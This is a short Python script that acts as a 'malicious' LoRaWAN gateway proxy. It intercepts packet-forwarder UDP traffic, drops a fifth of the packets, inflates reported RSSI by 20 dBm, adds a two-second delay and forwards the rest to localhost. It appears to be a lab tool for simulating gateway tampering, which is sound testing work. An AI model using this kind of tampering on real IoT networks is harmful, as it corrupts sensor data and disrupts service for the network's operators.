import socket
import json
import time
import random

# config
IN_PORT = 1700
OUT_PORT = 1701
TARGET_IP = "127.0.0.1"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", IN_PORT))

# print message to show that the proxy is running
print("Malicious Gateway Proxy Active...")

while True:
    data, addr = sock.recvfrom(2048)
    
    # packet forwarder protocol has a 12-byte header before the JSON
    header = data[:12]
    payload = data[12:]

    try:
        msg = json.loads(payload)
        
        # drop packets (20% loss)
        if random.random() < 0.20:
            print("Dropped packet.")
            continue

        # 2. change rssi (add +20dBm)
        if 'rxpk' in msg:
            for pkt in msg['rxpk']:
                pkt['rssi'] = pkt['rssi'] + 20
                print(f"Modified RSSI to: {pkt['rssi']}")

        # 3. inject latency (2 seconds)
        time.sleep(2)

        new_payload = json.dumps(msg).encode('utf-8')
        sock.sendto(header + new_payload, (TARGET_IP, OUT_PORT))

    except Exception as e:
        sock.sendto(data, (TARGET_IP, OUT_PORT))